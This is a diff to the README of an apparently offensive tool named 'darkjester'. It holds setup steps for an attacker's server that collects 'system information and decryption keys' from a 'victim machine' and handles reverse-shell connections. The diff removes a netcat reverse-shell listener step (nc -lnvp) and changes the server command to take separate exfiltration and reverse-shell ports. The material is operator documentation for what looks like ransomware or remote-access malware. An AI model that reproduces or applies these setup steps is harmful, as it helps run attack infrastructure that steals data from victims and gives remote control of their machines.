@@ -69,19 +69,13 @@
       pacman -S gnu-netcat
       ```
 
-3. **Setup the Netcat Listener**:
-    - Start listening on a specific port for the reverse shell to connect back:
-      ```bash
-      nc -lnvp <port>
-      ```
-
-4. **Run the Flask server**:
+3. **Run the Flask server**:
     - Ensure the Flask server is set up and running to accept system information and decryption keys:
       ```bash
-      python3 darkjester_server.py <PORT>
+      python3 darkjester_server.py <EXFIL_PORT> <REVERSE_SHELL_PORT>
       ```
 
-5. **Wait for connections**, The server should now be ready to handle requests from the victim machine.
+4. **Wait for connections**, The server should now be ready to handle requests from the victim machine.
 
 
 ## Usage
